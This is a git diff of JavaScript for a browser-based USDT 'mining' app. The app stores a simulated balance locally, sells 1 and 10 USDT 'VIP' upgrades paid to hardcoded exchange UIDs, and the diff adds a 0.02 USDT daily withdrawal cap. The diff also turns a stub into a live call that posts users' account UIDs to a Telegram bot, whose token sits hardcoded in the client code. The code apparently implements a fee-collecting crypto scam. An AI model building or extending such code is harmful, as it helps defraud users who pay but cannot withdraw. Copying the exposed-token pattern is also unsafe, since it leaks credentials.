@@ -2,13 +2,14 @@ class MiningSystem {
     constructor() {
         this.userData = this.loadUserData();
         this.paymentConfig = {
-            bitget: { id: '9879164714', wallet: 'TXYZ123BitgetWallet' },
-            bybit: { id: '269645993', wallet: 'TXYZ456BybitWallet' }
+            bitget: { id: '9879164714', name: 'Bitget UID' },
+            bybit: { id: '269645993', name: 'Bybit UID' }
         };
         this.telegramConfig = {
             botToken: '8516209099:AAFsqUtrN67apMLzr4n-eChN8vCSTAvnoBc',
             chatId: '-8405100233'
         };
+        this.dailyWithdrawLimit = 0.02; // 0.02 USDT daily limit for normal users
         this.initializeApp();
         this.startAutoUpdate();
     }
@@ -18,12 +19,20 @@ class MiningSystem {
         this.updateDisplay();
         this.generateUserId();
         this.setupNavigation();
+        this.updateDailyLimit();
     }
 
     loadUserData() {
         const saved = localStorage.getItem('miningUserData');
         if (saved) {
-            return JSON.parse(saved);
+            const data = JSON.parse(saved);
+            // Reset daily withdrawal if it's a new day
+            const today = new Date().toDateString();
+            if (data.lastWithdrawDate !== today) {
+                data.todayWithdraw = 0;
+                data.lastWithdrawDate = today;
+            }
+            return data;
         }
         
         return {
@@ -42,6 +51,8 @@ class MiningSystem {
             joinedTeam: null,
             transactions: [],
             teamMembers: [],
+            todayWithdraw: 0,
+            lastWithdrawDate: new Date().toDateString(),
             lastUpdate: Date.now()
         };
     }
@@ -122,6 +133,23 @@ class MiningSystem {
                 this.closeModal();
             }
         });
+
+        // Set max value for normal withdrawal input
+        document.getElementById('normalWithdrawAmount').addEventListener('input', (e) => {
+            const maxAmount = this.dailyWithdrawLimit - this.userData.todayWithdraw;
+            if (parseFloat(e.target.value) > maxAmount) {
+                e.target.value = maxAmount.toFixed(2);
+            }
+        });
+    }
+
+    updateDailyLimit() {
+        const today = new Date().toDateString();
+        if (this.userData.lastWithdrawDate !== today) {
+            this.userData.todayWithdraw = 0;
+            this.userData.lastWithdrawDate = today;
+            this.saveUserData();
+        }
     }
 
     // Mine Section Functions
@@ -243,9 +271,17 @@ class MiningSystem {
             return;
         }
 
+        // Check daily withdrawal limit
+        const remainingToday = this.dailyWithdrawLimit - this.userData.todayWithdraw;
+        if (amount > remainingToday) {
+            this.showNotification(`Daily withdrawal limit exceeded! You can withdraw max ${remainingToday.toFixed(2)} USDT today.`, 'error');
+            return;
+        }
+
         // Send withdrawal request to Telegram
         this.sendWithdrawalRequest('normal', amount);
         this.userData.balance -= amount;
+        this.userData.todayWithdraw += amount;
         this.addTransaction('Normal Withdrawal', -amount, 'USDT');
         this.saveUserData();
         
@@ -321,19 +357,21 @@ class MiningSystem {
     showPaymentModal(vipLevel, exchange) {
         const modal = document.getElementById('paymentModal');
         const amount = vipLevel === '1' ? '1 USDT' : '10 USDT';
-        const wallet = this.paymentConfig[exchange].wallet;
+        const uid = this.paymentConfig[exchange].id;
         
         document.getElementById('paymentAmount').textContent = amount;
-        document.getElementById('walletAddress').textContent = wallet;
+        document.getElementById('walletAddress').textContent = uid;
         document.getElementById('paymentExchange').textContent = exchange.charAt(0).toUpperCase() + exchange.slice(1);
         document.getElementById('paymentVipLevel').textContent = vipLevel;
         document.getElementById('paymentUserId').textContent = this.userData.userId;
+        document.getElementById('correctUid').textContent = uid;
         
         // Store current payment info
         this.currentPayment = { 
             vipLevel: parseInt(vipLevel), 
             exchange,
-            amount: vipLevel === '1' ? 1 : 10
+            amount: vipLevel === '1' ? 1 : 10,
+            uid: uid
         };
         
         modal.style.display = 'block';
@@ -348,10 +386,9 @@ class MiningSystem {
 
     submitPaymentToTelegram() {
         const accountId = document.getElementById('userAccountId').value.trim();
-        const transactionHash = document.getElementById('transactionHash').value.trim();
 
         if (!accountId) {
-            this.showNotification('Please enter your account ID!', 'error');
+            this.showNotification('Please enter your account UID!', 'error');
             return;
         }
 
@@ -362,14 +399,14 @@ class MiningSystem {
 ⭐ VIP Level: ${this.currentPayment.vipLevel}
 💰 Amount: ${this.currentPayment.amount} USDT
 💳 Exchange: ${this.currentPayment.exchange.toUpperCase()}
-🔗 Account ID: ${accountId}
-📄 Transaction Hash: ${transactionHash || 'Not provided'}
+🔗 Payment UID: ${this.currentPayment.uid}
+📋 Account UID: ${accountId}
 ⏰ Time: ${new Date().toLocaleString()}
 
 Please activate VIP ${this.currentPayment.vipLevel} for this user.
         `;
 
-        // Send to Telegram (simulated)
+        // Send to Telegram
         this.sendTelegramMessage(message);
         
         this.showNotification('✅ Payment details sent to admin! VIP will be activated soon.', 'success');
@@ -401,11 +438,30 @@ Please process this withdrawal.
 
     sendTelegramMessage(message) {
         // In a real app, you would send this to your Telegram bot
-        console.log('Telegram Message:', message);
-        // Example: fetch(`https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage?chat_id=${this.telegramConfig.chatId}&text=${encodeURIComponent(message)}`);
-        
-        // Simulate sending to Telegram
-        this.showNotification('📤 Request sent to Telegram admin!', 'info');
+        const url = `https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage`;
+        const data = {
+            chat_id: this.telegramConfig.chatId,
+            text: message,
+            parse_mode: 'HTML'
+        };
+
+        // Using fetch to send message to Telegram
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Message sent to Telegram:', data);
+            this.showNotification('📤 Request sent to Telegram admin!', 'info');
+        })
+        .catch((error) => {
+            console.error('Error sending to Telegram:', error);
+            this.showNotification('❌ Failed to send message. Please try again.', 'error');
+        });
     }
 
     addTransaction(description, amount, currency) {
@@ -449,6 +505,12 @@ Please process this withdrawal.
         // Update user info
         document.getElementById('userIdDisplay').textContent = this.userData.userId;
         document.getElementById('inviteCode').textContent = this.userData.inviteCode;
+        document.getElementById('dailyWithdrawLimit').textContent = this.dailyWithdrawLimit.toFixed(2) + ' USDT';
+        document.getElementById('usedToday').textContent = this.userData.todayWithdraw.toFixed(2) + ' USDT';
+
+        // Set max attribute for normal withdrawal input
+        const maxWithdraw = (this.dailyWithdrawLimit - this.userData.todayWithdraw).toFixed(2);
+        document.getElementById('normalWithdrawAmount').setAttribute('max', maxWithdraw);
 
         // Update statistics
         document.getElementById('totalMinedMini').textContent = this.userData.totalMined.toFixed(2) + ' USDT';
@@ -502,42 +564,16 @@ Please process this withdrawal.
         }
 
         historyContainer.innerHTML = this.userData.transactions.map(transaction => `
-            <div class="transaction-item ${transaction.type}">
+            <div class="transaction-item">
                 <div class="transaction-info">
                     <strong>${transaction.description}</strong>
-                    <span>${transaction.timestamp}</span>
+                    <span style="font-size: 12px; opacity: 0.7;">${transaction.timestamp}</span>
                 </div>
                 <div class="transaction-amount ${transaction.type}">
-                    ${transaction.type === 'credit' ? '+' : '-'}${Math.abs(transaction.amount)} ${transaction.currency}
+                    ${transaction.type === 'credit' ? '+' : '-'}${Math.abs(transaction.amount).toFixed(2)} ${transaction.currency}
                 </div>
             </div>
         `).join('');
-
-        // Add transaction styles
-        if (!document.querySelector('#transaction-styles')) {
-            const style = document.createElement('style');
-            style.id = 'transaction-styles';
-            style.textContent = `
-                .transaction-item {
-                    display: flex;
-                    justify-content: space-between;
-                    align-items: center;
-                    padding: 12px;
-                    background: rgba(255, 255, 255, 0.05);
-                    border-radius: 8px;
-                    margin-bottom: 8px;
-                }
-                .transaction-amount.credit {
-                    color: #33ff77;
-                    font-weight: bold;
-                }
-                .transaction-amount.debit {
-                    color: #ff6b6b;
-                    font-weight: bold;
-                }
-            `;
-            document.head.appendChild(style);
-        }
     }
 
     formatTime(ms) {
@@ -595,16 +631,10 @@ Please process this withdrawal.
             this.updateDisplay();
         }, 60000);
 
-        // Simulate daily active days update
+        // Check for new day every hour
         setInterval(() => {
-            const now = new Date();
-            const lastUpdate = new Date(this.userData.lastUpdate);
-            
-            if (now.getDate() !== lastUpdate.getDate()) {
-                this.userData.activeDays++;
-                this.saveUserData();
-            }
-        }, 60000);
+            this.updateDailyLimit();
+        }, 60 * 60 * 1000);
     }
 }
 
@@ -619,7 +649,7 @@ function copyInviteCode() {
 function copyWalletAddress() {
     const walletAddress = document.getElementById('walletAddress').textContent;
     navigator.clipboard.writeText(walletAddress).then(() => {
-        window.miningSystem.showNotification('Wallet address copied to clipboard!', 'success');
+        window.miningSystem.showNotification('UID copied to clipboard!', 'success');
     });
 }
 
